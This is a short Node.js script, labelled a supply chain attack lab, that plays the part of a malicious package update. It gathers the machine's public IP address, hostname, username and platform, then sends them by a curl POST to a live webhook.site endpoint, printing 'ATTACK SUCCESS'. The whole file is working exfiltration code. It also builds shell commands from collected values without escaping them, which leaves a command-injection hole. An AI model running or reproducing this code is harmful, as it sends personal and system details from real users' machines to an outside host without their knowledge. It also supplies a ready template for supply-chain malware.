const https = require('https');
const { execSync } = require('child_process');
const os = require('os');

console.log('🚀 SUPPLY CHAIN ATTACK LAB');
console.log('🔍 Checking malicious updates...');

https.get('https://httpbin.org/json', (res) => {
  let data = '';
  res.on('data', d => data += d);
  res.on('end', () => {
    console.log('📡 Malicious payload activated!');
    
    const victimData = {
      ip: execSync('curl -s ifconfig.me').toString().trim(),
      hostname: os.hostname(),
      username: os.userInfo().username,
      platform: os.platform(),
      timestamp: new Date().toISOString()
    };
    
    console.log('🎯 VICTIM:', victimData.ip);
    
    // LINUX-SAFE EXFIL
    const payload = `ip=${victimData.ip}&user=${victimData.username}&os=${victimData.platform}`;
    execSync(`curl -X POST "https://webhook.site/1f4385f5-313c-4fe3-b9ee-25c4e06e1439" -d "${payload}"`);
    
    console.log('✅ ATTACK SUCCESS!');
  });
});

